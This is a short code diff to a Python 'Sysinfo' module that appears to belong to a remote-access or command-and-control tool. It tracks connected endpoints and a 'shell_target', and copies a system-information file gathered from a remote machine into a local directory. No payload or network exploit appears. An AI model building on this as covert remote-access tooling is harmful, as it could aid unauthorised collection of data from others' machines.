@@ -35,7 +35,7 @@ class Sysinfo:
             self.file_path = os.path.join(self.ident_path, self.filename)
             self.logger.debug(f"File path: {self.ident_path}")
 
-        except (Exception, socket.error) as e:
+        except (WindowsError, socket.error) as e:
             self.logger.debug(f"Connection error: {e}")
             self.logger.debug(f"server.remove_lost_connection({self.endpoint})...")
             self.server.remove_lost_connection(self.endpoint)
@@ -103,6 +103,10 @@ class Sysinfo:
             self.logger.debug(f"File validation Error: {e}")
             return False
 
+    def display_text(self):
+        self.logger.info(f"Running display_text...")
+        os.startfile(self.file_path)
+
     def run(self):
         self.logger.info(f"Running Sysinfo...")
         self.logger.debug(f"Calling get_file_name...")
@@ -118,7 +122,10 @@ class Sysinfo:
 
         for endpoint in self.server.endpoints:
             if endpoint.conn == self.shell_target:
-                shutil.move(self.file_path, self.local_dir)
+                shutil.copy(self.file_path, self.local_dir)
 
+        # self.logger.debug(f"Calling display_text...")
+        # self.display_text()
         self.logger.info(f"Sysinfo completed.")
+
         return True
